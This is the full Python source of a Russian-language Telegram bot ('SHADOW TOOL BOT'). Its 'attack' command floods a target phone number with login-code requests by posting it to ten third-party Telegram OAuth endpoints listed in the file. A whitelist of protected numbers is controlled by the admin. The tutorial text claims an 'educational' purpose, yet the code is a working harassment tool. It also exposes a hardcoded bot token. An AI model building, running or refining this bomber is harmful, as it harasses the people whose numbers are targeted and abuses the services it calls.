import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import json
import os

BOT_TOKEN = '8768938960:AAGe5Pwh32P13XbwzXj7fzl5DVhYJLEIj0w'
ADMIN_ID = 8434489753

bot = telebot.TeleBot(BOT_TOKEN)
WHITELIST_FILE = 'whitelist.json'

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
]

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        with open(WHITELIST_FILE, 'r') as f:
            return json.load(f)
    return []

def save_whitelist(wl):
    with open(WHITELIST_FILE, 'w') as f:
        json.dump(wl, f, indent=2)

whitelist = load_whitelist()

def normalize_phone(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('8'):
        clean = '7' + clean[1:]
    if len(clean) == 10:
        clean = '7' + clean
    if not clean.startswith('+'):
        clean = '+' + clean
    return clean

def is_admin(user_id):
    return user_id == ADMIN_ID

# ========== ГЛАВНОЕ МЕНЮ (кнопки рядом с полем ввода) ==========
def get_main_menu(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    if is_admin(user_id):
        # Админ видит всё
        markup.add(
            KeyboardButton("🚀 АТАКА"),
            KeyboardButton("📖 ТУТОРИАЛ")
        )
        markup.add(
            KeyboardButton("📋 БЕЛЫЙ СПИСОК"),
            KeyboardButton("➕ ДОБАВИТЬ НОМЕР"),
            KeyboardButton("❌ УДАЛИТЬ НОМЕР")
        )
        markup.add(
            KeyboardButton("👑 АДМИН ПАНЕЛЬ"),
            KeyboardButton("📊 СТАТИСТИКА")
        )
    else:
        # Обычный юзер видит только атаку и туториал
        markup.add(
            KeyboardButton("🚀 АТАКА"),
            KeyboardButton("📖 ТУТОРИАЛ")
        )
    
    return markup

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🔮 SHADOW TOOL BOT 🔮\n\n"
        f"👑 Статус: {'АДМИН' if is_admin(message.from_user.id) else 'ПОЛЬЗОВАТЕЛЬ'}\n\n"
        "📌 Используй кнопки в меню 👇",
        reply_markup=get_main_menu(message.from_user.id)
    )

# Обработка кнопок
@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.from_user.id
    text = message.text
    
    if text == "🚀 АТАКА":
        bot.send_message(message.chat.id, "📞 Введи номер для атаки:\nПример: +79001234567")
        bot.register_next_step_handler(message, attack_handler)
    
    elif text == "📖 ТУТОРИАЛ":
        bot.send_message(
            message.chat.id,
            "📖 ТУТОРИАЛ\n\n"
            "1️⃣ Нажми 'АТАКА' или введи /a +79001234567\n"
            "2️⃣ Бот отправит 10 запросов на Telegram API\n"
            "3️⃣ Номера из белого списка НЕ атакуются\n\n"
            "⚠️ Только для образовательных целей!\n\n"
            "👑 Админ: @fallsfack",
            reply_markup=get_main_menu(user_id)
        )
    
    elif text == "📋 БЕЛЫЙ СПИСОК":
        if not is_admin(user_id):
            bot.send_message(message.chat.id, "⛔ Доступ запрещён! Только для админа.")
            return
        if whitelist:
            phones = '\n'.join(whitelist)
            bot.send_message(message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n{phones}", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, "📋 Белый список пуст", reply_markup=get_main_menu(user_id))
    
    elif text == "➕ ДОБАВИТЬ НОМЕР":
        if not is_admin(user_id):
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
            return
        bot.send_message(message.chat.id, "📝 Введи номер для добавления:\nПример: +79001234567")
        bot.register_next_step_handler(message, add_number_handler)
    
    elif text == "❌ УДАЛИТЬ НОМЕР":
        if not is_admin(user_id):
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
            return
        bot.send_message(message.chat.id, "📝 Введи номер для удаления:\nПример: +79001234567")
        bot.register_next_step_handler(message, remove_number_handler)
    
    elif text == "👑 АДМИН ПАНЕЛЬ":
        if not is_admin(user_id):
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
            return
        admin_panel(message)
    
    elif text == "📊 СТАТИСТИКА":
        if not is_admin(user_id):
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!")
            return
        bot.send_message(message.chat.id, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров\n👥 Пользователей: 1", reply_markup=get_main_menu(user_id))

def attack_handler(message):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    try:
        normalized = normalize_phone(phone)
        
        if normalized in whitelist:
            bot.send_message(message.chat.id, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!", reply_markup=get_main_menu(user_id))
            return
        
        msg = bot.send_message(message.chat.id, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
        
        sent = 0
        for i, url in enumerate(ATTACK_URLS):
            try:
                requests.post(url, data={'phone': normalized}, timeout=5)
                sent += 1
            except:
                sent += 1
            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
            time.sleep(0.3)
        
        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", message.chat.id, msg.message_id)
        bot.send_message(message.chat.id, "✅ Готово!", reply_markup=get_main_menu(user_id))
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}", reply_markup=get_main_menu(user_id))

def add_number_handler(message):
    user_id = message.from_user.id
    try:
        normalized = normalize_phone(message.text.strip())
        if normalized not in whitelist:
            whitelist.append(normalized)
            save_whitelist(whitelist)
            bot.send_message(message.chat.id, f"✅ {normalized} добавлен в белый список!", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, f"⚠️ {normalized} уже в списке!", reply_markup=get_main_menu(user_id))
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат!", reply_markup=get_main_menu(user_id))

def remove_number_handler(message):
    user_id = message.from_user.id
    try:
        normalized = normalize_phone(message.text.strip())
        if normalized in whitelist:
            whitelist.remove(normalized)
            save_whitelist(whitelist)
            bot.send_message(message.chat.id, f"✅ {normalized} удалён из белого списка!", reply_markup=get_main_menu(user_id))
        else:
            bot.send_message(message.chat.id, f"⚠️ {normalized} не найден!", reply_markup=get_main_menu(user_id))
    except:
        bot.send_message(message.chat.id, "❌ Неверный формат!", reply_markup=get_main_menu(user_id))

def admin_panel(message):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("📋 Показать список", callback_data="admin_show_list"),
        InlineKeyboardButton("➕ Добавить номер", callback_data="admin_add"),
        InlineKeyboardButton("❌ Удалить номер", callback_data="admin_remove"),
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast"),
        InlineKeyboardButton("🔄 Перезапуск", callback_data="admin_restart")
    )
    bot.send_message(message.chat.id, "👑 АДМИН ПАНЕЛЬ\n\nВыбери действие:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "⛔ Доступ запрещён!")
        return
    
    if call.data == "admin_show_list":
        if whitelist:
            bot.send_message(call.message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n" + '\n'.join(whitelist))
        else:
            bot.send_message(call.message.chat.id, "📋 Белый список пуст")
    
    elif call.data == "admin_add":
        bot.send_message(call.message.chat.id, "📝 Введи номер для добавления:")
        bot.register_next_step_handler(call.message, add_number_handler)
    
    elif call.data == "admin_remove":
        bot.send_message(call.message.chat.id, "📝 Введи номер для удаления:")
        bot.register_next_step_handler(call.message, remove_number_handler)
    
    elif call.data == "admin_stats":
        bot.send_message(call.message.chat.id, f"📊 СТАТИСТИКА:\n\n📋 В белом списке: {len(whitelist)} номеров")
    
    elif call.data == "admin_broadcast":
        bot.send_message(call.message.chat.id, "📢 Введи текст для рассылки:")
        bot.register_next_step_handler(call.message, broadcast_handler)
    
    elif call.data == "admin_restart":
        bot.send_message(call.message.chat.id, "🔄 Перезапуск...")
        os._exit(0)
    
    bot.answer_callback_query(call.id)

def broadcast_handler(message):
    text = message.text
    # Тут можно добавить список всех пользователей
    bot.send_message(message.chat.id, f"✅ Рассылка отправлена!\nТекст: {text}")

# Короткая команда для атаки
@bot.message_handler(commands=['a'])
def attack_short(message):
    try:
        phone = message.text.split()[1]
        normalized = normalize_phone(phone)
        
        if normalized in whitelist:
            bot.reply_to(message, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!")
            return
        
        msg = bot.reply_to(message, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
        
        sent = 0
        for i, url in enumerate(ATTACK_URLS):
            try:
                requests.post(url, data={'phone': normalized}, timeout=5)
                sent += 1
            except:
                sent += 1
            bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
            time.sleep(0.3)
        
        bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Используй: /a +79001234567")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {str(e)}")

print("🤖 Бот запущен!")
print(f"👑 Админ ID: {ADMIN_ID}")
bot.infinity_polling()
